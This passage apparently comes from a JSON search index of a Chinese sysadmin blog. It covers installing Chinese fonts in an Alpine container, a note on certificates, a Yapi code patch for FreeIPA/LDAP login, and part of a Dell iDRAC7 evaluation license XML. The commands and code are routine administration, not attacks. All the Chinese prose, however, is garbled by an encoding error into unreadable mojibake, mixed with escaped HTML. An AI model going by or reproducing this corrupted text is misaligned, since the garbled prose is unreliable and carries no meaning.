jq\n\u003c/code\u003e\u003c/pre\u003e","title":"ç»ç‰ˆçš„elasticflowçš„å®‰è£…"},{"content":"pod å®¹å™¨å†…è¦ç”¨ä¸­æ–‡é›…é»‘å­—ä½“ç”Ÿæˆ jpg å›¾ç‰‡ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æŠŠå­—ä½“ç»™è£…è¿›å»\né¦–å…ˆè¿›å…¥å®¹å™¨ï¼Œç¡®å®šå®¹å™¨çš„åŸºåº•æ˜¯ä»€ä¹ˆï¼Œæ˜¯yumã€aptæˆ–è€…apk\né€šå¸¸éƒ½æ˜¯ç”¨apkæœ€å°åŒ–å®‰è£…çš„ï¼Œè¿™æ ·åšæ³•å¦‚ä¸‹ï¼š\napk update apk add --update ttf-dejavu fontconfig rm -rf /var/cache/apk/* mkdir /usr/share/fonts/chinese cp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese mkfontscale \u0026amp;\u0026amp; mkfontdir \u0026amp;\u0026amp; fc-cache è¿™æ ·å°±æå®šäº†ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸´æ—¶çš„ã€‚\nè¦æƒ³é•¿ä¹…å°±å¾—ä¿®æ”¹Dockerfileï¼ŒæŠŠæ–‡ä»¶æ‹·è¿›å®¹å™¨ï¼Œç„¶ååŒæ ·å¾—æ‰§è¡Œå‘½ä»¤å³å¯ã€‚\n","permalink":"https://rendoumi.com/posts/20230706-fonts_in_pod/","summary":"\u003cp\u003epod å®¹å™¨å†…è¦ç”¨ä¸­æ–‡é›…é»‘å­—ä½“ç”Ÿæˆ jpg å›¾ç‰‡ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æŠŠå­—ä½“ç»™è£…è¿›å»\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆè¿›å…¥å®¹å™¨ï¼Œç¡®å®šå®¹å™¨çš„åŸºåº•æ˜¯ä»€ä¹ˆï¼Œæ˜¯yumã€aptæˆ–è€…apk\u003c/p\u003e\n\u003cp\u003eé€šå¸¸éƒ½æ˜¯ç”¨apkæœ€å°åŒ–å®‰è£…çš„ï¼Œè¿™æ ·åšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add --update ttf-dejavu fontconfig\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm -rf /var/cache/apk/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/share/fonts/chinese\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkfontscale \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e mkfontdir \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e fc-cache\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±æå®šäº†ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸´æ—¶çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¦æƒ³é•¿ä¹…å°±å¾—ä¿®æ”¹Dockerfileï¼ŒæŠŠæ–‡ä»¶æ‹·è¿›å®¹å™¨ï¼Œç„¶ååŒæ ·å¾—æ‰§è¡Œå‘½ä»¤å³å¯ã€‚\u003c/p\u003e","title":"å¦‚ä½•åœ¨å®¹å™¨å†…å®‰è£…å­—ä½“æ–‡ä»¶"},{"content":"2023å¹´ä¸ŠåŠå¹´ç»è¿‡åŠªåŠ›ï¼Œåˆè€ƒäº†3å¼ è¯ä¹¦ï¼Œä¸‹åŠå¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\n","permalink":"https://rendoumi.com/posts/20230630-certificates/","summary":"\u003cp\u003e2023å¹´ä¸ŠåŠå¹´ç»è¿‡åŠªåŠ›ï¼Œåˆè€ƒäº†3å¼ è¯ä¹¦ï¼Œä¸‹åŠå¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630161935782\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630161935782.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630162007269\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630162007269.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630162040982\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630162040982.png\"\u003e\u003c/p\u003e","title":"2023å¹´è·å¾—çš„è¯ä¹¦"},{"content":"Freeipaæ¥å…¥Yapi.\nvi my-api/config.json\n... \u0026#34;ldapLogin\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;server\u0026#34;: \u0026#34;ldap://ldap.bybon.cn\u0026#34;, \u0026#34;baseDn\u0026#34;: \u0026#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, \u0026#34;bindPassword\u0026#34;: \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;searchDn\u0026#34;: \u0026#34;cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, \u0026#34;searchStandard\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;emailPostfix\u0026#34;: \u0026#34;@bybon.cn\u0026#34;, \u0026#34;emailKey\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;usernameKey\u0026#34;: \u0026#34;displayName\u0026#34; } è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œvi my-yapi/vendors/server/controllers/user.js\nç†ç”±å¦‚ä¸‹ï¼Œç™»å½•çš„æ—¶å€™ï¼Œyapiçš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·é‚®ä»¶ï¼ŒæŠŠé‚®ä»¶ä¸­çš„ç”¨æˆ·åæ‘˜å‡ºæ¥ï¼Œç„¶ååŠ ä¸Šé…ç½®ä¸­çš„é‚®ä»¶åŸŸã€‚\nè¿™ä¸ªé€»è¾‘åœ¨ldapä¸­å°±ä¸å¯¹äº†ï¼Œæ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼Œè¿™æ ·ç›´æ¥è¾“å…¥ldapç”¨æˆ·åå°±å¯ä»¥ç™»å½•äº†\n/** * ldapç™»å½• * @interface /user/login_by_ldap * @method * @category user * @foldnumber 10 * @param {String} email emailåç§°ï¼Œä¸èƒ½ä¸ºç©º * @param {String} password å¯†ç ï¼Œä¸èƒ½ä¸ºç©º * @returns {Object} * */ async getLdapAuth(ctx) { try { const { email, password } = ctx.request.body; //no const username = email.split(/\\@/g)[0]; //1 const { info: ldapInfo } = await ldap.ldapQuery(email, password); //2 const emailPrefix = email.split(/\\@/g)[0]; //3 const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; //zrr const emailPrefix = email.split(/\\@/g)[0]; const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; const { info: ldapInfo } = await ldap.ldapQuery( (emailPostfix ? emailPrefix + emailPostfix : email),password); //zrr const emailParams = ldapInfo[yapi.WEBCONFIG.ldapLogin.emailKey || \u0026#39;mail\u0026#39;] || (emailPostfix ? emailPrefix + emailPostfix : email); const username = ldapInfo[yapi.WEBCONFIG.ldapLogin.usernameKey] || emailPrefix; ","permalink":"https://rendoumi.com/posts/20230412-freeipa_yapi/","summary":"\u003cp\u003eFreeipaæ¥å…¥Yapi.\u003c/p\u003e\n\u003cp\u003evi my-api/config.json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ldapLogin\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;enable\u0026#34;\u003c/span\u003e: true,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;server\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;ldap://ldap.bybon.cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;baseDn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;bindPassword\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;searchDn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;searchStandard\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;emailPostfix\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;@bybon.cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;emailKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;usernameKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;displayName\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œvi my-yapi/vendors/server/controllers/user.js\u003c/p\u003e\n\u003cp\u003eç†ç”±å¦‚ä¸‹ï¼Œç™»å½•çš„æ—¶å€™ï¼Œyapiçš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·é‚®ä»¶ï¼ŒæŠŠé‚®ä»¶ä¸­çš„ç”¨æˆ·åæ‘˜å‡ºæ¥ï¼Œç„¶ååŠ ä¸Šé…ç½®ä¸­çš„é‚®ä»¶åŸŸã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªé€»è¾‘åœ¨ldapä¸­å°±ä¸å¯¹äº†ï¼Œæ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼Œè¿™æ ·ç›´æ¥è¾“å…¥ldapç”¨æˆ·åå°±å¯ä»¥ç™»å½•äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * ldapç™»å½•\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @interface /user/login_by_ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @method\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @category user\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @foldnumber \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @param \u003cspan class=\"o\"\u003e{\u003c/span\u003eString\u003cspan class=\"o\"\u003e}\u003c/span\u003e email emailåç§°ï¼Œä¸èƒ½ä¸ºç©º\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @param  \u003cspan class=\"o\"\u003e{\u003c/span\u003eString\u003cspan class=\"o\"\u003e}\u003c/span\u003e password å¯†ç ï¼Œä¸èƒ½ä¸ºç©º\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @returns \u003cspan class=\"o\"\u003e{\u003c/span\u003eObject\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   *\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  async getLdapAuth\u003cspan class=\"o\"\u003e(\u003c/span\u003ectx\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"o\"\u003e{\u003c/span\u003e email, password \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ctx.request.body\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //no const \u003cspan class=\"nv\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //1 const \u003cspan class=\"o\"\u003e{\u003c/span\u003e info: ldapInfo \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await ldap.ldapQuery\u003cspan class=\"o\"\u003e(\u003c/span\u003eemail, password\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //2 const \u003cspan class=\"nv\"\u003eemailPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //3 const \u003cspan class=\"nv\"\u003eemailPostfix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yapi.WEBCONFIG.ldapLogin.emailPostfix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailPostfix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yapi.WEBCONFIG.ldapLogin.emailPostfix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"o\"\u003e{\u003c/span\u003e info: ldapInfo \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await ldap.ldapQuery\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003eemailPostfix ? emailPrefix + emailPostfix : email\u003cspan class=\"o\"\u003e)\u003c/span\u003e,password\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailParams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ldapInfo\u003cspan class=\"o\"\u003e[\u003c/span\u003eyapi.WEBCONFIG.ldapLogin.emailKey \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;mail\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003eemailPostfix ? emailPrefix + emailPostfix : email\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ldapInfo\u003cspan class=\"o\"\u003e[\u003c/span\u003eyapi.WEBCONFIG.ldapLogin.usernameKey\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e emailPrefix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Yapié›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"content":"æ–°å…¬å¸çš„dellæœåŠ¡å™¨idracå±…ç„¶æ²¡æœ‰licenseï¼Œæ— æ³•è¿œç¨‹ï¼Œæ‰¾äº†dellè¦äº†ä¸€ä¸ªä¸´æ—¶licenseç»™è£…ä¸Šï¼Œå…¶å®è£…å¥½ç³»ç»Ÿå°±ä¸ä¼šå¤ªç”¨åˆ°äº†ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åå¤‡ç”¨ã€‚\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--\u0026gt; \u0026lt;lns:LicenseClass xmlns:ds=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:lns=\u0026#34;http://www.dell.com/2011/12G/licensing\u0026#34;\u0026gt; \u0026lt;lns:LicenseData\u0026gt; \u0026lt;lns:Schema lns:Vendor=\u0026#34;Dell\u0026#34; lns:ID=\u0026#34;iDRAC\u0026#34; lns:maxDepth=\u0026#34;255\u0026#34; lns:SchemaVersion=\u0026#34;2.0\u0026#34;/\u0026gt; \u0026lt;lns:TransferableLicense\u0026gt;false\u0026lt;/lns:TransferableLicense\u0026gt; \u0026lt;lns:UTCdateSold\u0026gt;2011-09-20T16:10:37Z\u0026lt;/lns:UTCdateSold\u0026gt; \u0026lt;lns:EntitlementID\u0026gt;56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews\u0026lt;/lns:EntitlementID\u0026gt; \u0026lt;lns:DeviceClass lns:ID=\u0026#34;iDRAC\u0026#34;/\u0026gt; \u0026lt;lns:ProductDescription\u0026gt; \u0026lt;lns:lang_en\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_en\u0026gt; \u0026lt;lns:lang_es\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_es\u0026gt; \u0026lt;lns:lang_fr\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_fr\u0026gt; \u0026lt;lns:lang_de\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_de\u0026gt; \u0026lt;lns:lang_it\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_it\u0026gt; \u0026lt;lns:lang_ja\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_ja\u0026gt; \u0026lt;lns:lang_zh\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_zh\u0026gt; \u0026lt;/lns:ProductDescription\u0026gt; \u0026lt;lns:LicenseTerm\u0026gt; \u0026lt;lns:Evaluation lns:Duration=\u0026#34;P30D\u0026#34;/\u0026gt; \u0026lt;/lns:LicenseTerm\u0026gt; \u0026lt;lns:DeviceInfo lns:ID=\u0026#34;1\u0026#34; lns:VendorID=\u0026#34;0x1912\u0026#34; lns:DeviceID=\u0026#34;0x0011\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;1\u0026#34; lns:Description=\u0026#34;License Management\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;2\u0026#34; lns:Description=\u0026#34;RACADM\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;3\u0026#34; lns:Description=\u0026#34;WSMAN\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;4\u0026#34; lns:Description=\u0026#34;SNMP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;5\u0026#34; lns:Description=\u0026#34;Auto Discovery\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;6\u0026#34; lns:Description=\u0026#34;USC Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;7\u0026#34; lns:Description=\u0026#34;Update Package\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;8\u0026#34; lns:Description=\u0026#34;USC Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;9\u0026#34; lns:Description=\u0026#34;USC Device Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;10\u0026#34; lns:Description=\u0026#34;USC Diagnostics\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;11\u0026#34; lns:Description=\u0026#34;Power Budget\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;12\u0026#34; lns:Description=\u0026#34;Power Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;13\u0026#34; lns:Description=\u0026#34;Virtual Media\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;14\u0026#34; lns:Description=\u0026#34;Telnet\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;15\u0026#34; lns:Description=\u0026#34;SMASH CLP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;16\u0026#34; lns:Description=\u0026#34;IPv6\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;17\u0026#34; lns:Description=\u0026#34;Dynamic DNS\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;18\u0026#34; lns:Description=\u0026#34;Dedicated NIC\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;19\u0026#34; lns:Description=\u0026#34;Directory Services\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;20\u0026#34; lns:Description=\u0026#34;Two-Factor Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;21\u0026#34; lns:Description=\u0026#34;Single Sign-On\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;22\u0026#34; lns:Description=\u0026#34;PK Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;23\u0026#34; lns:Description=\u0026#34;Crash Screen Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;24\u0026#34; lns:Description=\u0026#34;Crash Video Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;25\u0026#34; lns:Description=\u0026#34;Boot Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;26\u0026#34; lns:Description=\u0026#34;Virtual Console\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;27\u0026#34; lns:Description=\u0026#34;Virtual Flash Partitions\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature 